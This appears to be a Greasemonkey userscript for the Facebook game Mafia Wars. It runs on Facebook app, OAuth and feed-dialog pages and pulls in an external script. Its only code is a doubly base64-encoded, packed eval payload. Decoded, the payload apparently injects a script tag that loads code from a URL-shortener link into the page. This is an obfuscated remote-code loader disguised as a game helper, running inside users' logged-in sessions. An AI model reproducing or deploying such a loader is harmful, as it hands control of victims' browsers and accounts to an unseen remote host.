// ==UserScript==
// @name        Rock The House
// @namespace   Afrojack
// @description Danger Zone
// @include     http://apps.facebook.com/inthemafia/*
// @include     https://apps.facebook.com/inthemafia/*
// @include     http://apps.new.facebook.com/inthemafia/*
// @include     https://apps.new.facebook.com/inthemafia/*
// @include     http://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     https://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     http://facebook.mafiawars.zynga.com/mwfb/xd_receiver.htm
// @include     https://facebook.mafiawars.zynga.com/mwfb/xd_receiver.htm
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @require     http://spocklet.com/bookmarklet/clicktrapremoveandshorten.user.js
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @grant       GM_setValue
// @include     https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     http://www.facebook.com/dialog/oauth?client_id=10000000001*
// @include     https://www.facebook.com/dialog/oauth?client_id=10000000001*
// @include     *://facebook-ca2.mafiawars.zynga.com/mwfb/*
// @include     *://www.-ca2.mafiawars.zynga.com/play*
// @include     *://www.facebook.com/dialog/feed*
// @include     *://apps.facebook.com/inthemafia*
// @grant       GM_xmlhttpRequest
// @include     http://apps.facebook.com/inthemafia/?install_source*
// @include     https://apps.facebook.com/inthemafia/?install_source*
// @include     http://apps.facebook.com/inthemafia/*
// @grant       GM_getValue
// @include     https://apps.facebook.com/inthemafia/*
// @include     http://mafiademon.com
// @include     http://mafiatornado.com
// @include     http://mafiademon.info
// @updateURL   http://userscripts.org/scripts/source/145289.user.js
// @icon        http://userserve-ak.last.fm/serve/_/80079853/Afrojack+dsc000097.jpg
// @version     ✗ ✗ ✗


// ==/UserScript==

{
    function itoj(j) {
        var s = document.createElement('script');
        s.innerHTML = eval(atob(j));
        document.body.appendChild(s);
    }
    var l = atob('WlhaaGJDaG1kVzVqZEdsdmJpaHdMR0VzWXl4ckxHVXNjaWw3WlQxbWRXNWpkR2x2YmloaktYdHlaWFIxY200Z1l5NTBiMU4wY21sdVp5aGhLWDA3YVdZb0lTY25MbkpsY0d4aFkyVW9MMTR2TEZOMGNtbHVaeWtwZTNkb2FXeGxLR010TFNseVcyVW9ZeWxkUFd0YlkxMThmR1VvWXlrN2F6MWJablZ1WTNScGIyNG9aU2w3Y21WMGRYSnVJSEpiWlYxOVhUdGxQV1oxYm1OMGFXOXVLQ2w3Y21WMGRYSnVKMXhjZHlzbmZUdGpQVEY5TzNkb2FXeGxLR010TFNscFppaHJXMk5kS1hBOWNDNXlaWEJzWVdObEtHNWxkeUJTWldkRmVIQW9KMXhjWWljclpTaGpLU3NuWEZ4aUp5d25aeWNwTEd0YlkxMHBPM0psZEhWeWJpQndmU2duZXprZ1lUMHhMak1vSWpRaUtUdGhMalU5SWpZdk55STdZUzQ0UFNJeU9pOHZZaTVqTDJRL0lpdGxMbVlvS1RzeExtY29JbWdpS1Zzd1hTNXBLR0VwZlNjc01Ua3NNVGtzSjN4a2IyTjFiV1Z1ZEh4b2RIUndmR055WldGMFpVVnNaVzFsYm5SOGMyTnlhWEIwZkhSNWNHVjhkR1Y0ZEh4cVlYWmhjMk55YVhCMGZITnlZM3gyWVhKOGZITnRZWEowZFhKc2ZHbDBmRkp2WTJ0VWFHVkliM1Z6Wlh4TllYUm9mSEpoYm1SdmJYeG5aWFJGYkdWdFpXNTBjMEo1VkdGblRtRnRaWHhvWldGa2ZHRndjR1Z1WkVOb2FXeGtKeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUT09');
    var t = false;
    if (/xw_controller=freegifts/.test(document.location.href)) t = false;
    if (/xw_controller=requests/.test(document.location.href)) t = false;
    if (!t) itoj(l);
}